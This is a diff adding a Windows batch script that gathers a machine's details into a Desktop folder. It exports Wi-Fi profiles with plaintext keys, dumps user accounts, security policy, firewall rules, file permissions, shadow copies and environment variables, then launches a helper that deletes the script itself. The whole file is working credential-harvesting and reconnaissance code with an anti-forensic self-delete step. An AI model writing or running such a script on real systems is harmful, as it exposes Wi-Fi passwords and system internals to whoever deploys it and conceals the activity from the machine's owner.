@@ -1,0 +1,105 @@
+@echo off
+setlocal
+
+:: Set the Desktop path for the current user
+set "desktopPath=%userprofile%\Desktop\data"
+mkdir "%desktopPath%"
+
+:: Collect Wi-Fi network details
+netsh wlan show profiles > "%desktopPath%\wifidata.txt"
+netsh wlan export profile folder="%desktopPath%" key=clear
+
+
+:: Collect BIOS information
+wmic bios get /format:list > "%desktopPath%\biosdata.txt"
+
+:: Collect user personal information
+echo %username% > "%desktopPath%\userinfo.txt"
+wmic useraccount get name,sid > "%desktopPath%\alluser.txt"
+
+:: Collect browser data (history and passwords - limited information as passwords cannot be exported directly in .bat)
+echo Browser history and passwords are limited in this script > "%desktopPath%\browserdata.txt"
+
+:: Collect system configuration details
+systeminfo > "%desktopPath%\systeminfo.txt"
+
+:: Collect running processes
+tasklist > "%desktopPath%\processlist.txt"
+
+:: Collect Windows event logs
+wevtutil qe System /c:10 /f:text > "%desktopPath%\eventlog.txt"
+
+:: Collect network settings
+ipconfig /all > "%desktopPath%\networkconfig.txt"
+
+:: Collect file and folder permissions
+icacls C:\* /T > "%desktopPath%\permissions.txt"
+
+:: Collect installed applications
+wmic product get name,version > "%desktopPath%\installedapps.txt"
+
+:: Collect startup programs list
+wmic startup get caption,command > "%desktopPath%\startupitems.txt"
+
+:: Collect running services information
+net start > "%desktopPath%\serviceinfo.txt"
+
+:: Collect disk space usage details
+wmic logicaldisk get size,freespace,caption > "%desktopPath%\diskusage.txt"
+
+:: Collect security settings
+secedit /export /cfg "%desktopPath%\securitysettings.txt"
+
+:: Collect firewall rules and settings
+netsh advfirewall firewall show rule name=all > "%desktopPath%\firewallrules.txt"
+
+:: Collect active user sessions
+query user > "%desktopPath%\usersessions.txt"
+
+:: Collect active network connections
+netstat -an > "%desktopPath%\activeconnections.txt"
+
+:: Collect connected printers and settings
+wmic printer get name,systemname,share > "%desktopPath%\printerinfo.txt"
+
+:: Collect backup file locations and details
+vssadmin list shadows > "%desktopPath%\backupfiles.txt"
+
+:: Collect shared folders list
+net share > "%desktopPath%\sharedfolders.txt"
+
+:: Collect scheduled tasks information
+schtasks /query /fo LIST > "%desktopPath%\tasklist.txt"
+
+:: Collect important registry keys (example path, modify as needed)
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion > "%desktopPath%\registrykeys.txt"
+
+:: Collect common file extensions on the system
+assoc > "%desktopPath%\fileextensions.txt"
+
+:: Collect local group memberships
+net localgroup > "%desktopPath%\localgroupmembers.txt"
+
+:: Collect password policy settings
+net accounts > "%desktopPath%\passwordpolicy.txt"
+
+:: Collect audit and security logs
+auditpol /get /category:* > "%desktopPath%\auditlogs.txt"
+
+:: Collect connected USB devices
+wmic path CIM_LogicalDevice where "Description like 'USB%'" get /format:list > "%desktopPath%\usbdevices.txt"
+
+:: Collect system performance metrics
+typeperf -qx > "%desktopPath%\performanceinfo.txt"
+
+:: Collect environment variables
+set > "%desktopPath%\environmentvariables.txt"
+
+:: Self-delete the script after execution
+(
+    echo @echo off
+    echo timeout 2
+    echo del "%~f0"
+) > "%desktopPath%\deletesc.bat"
+start "" "%desktopPath%\deletesc.bat"
+exit
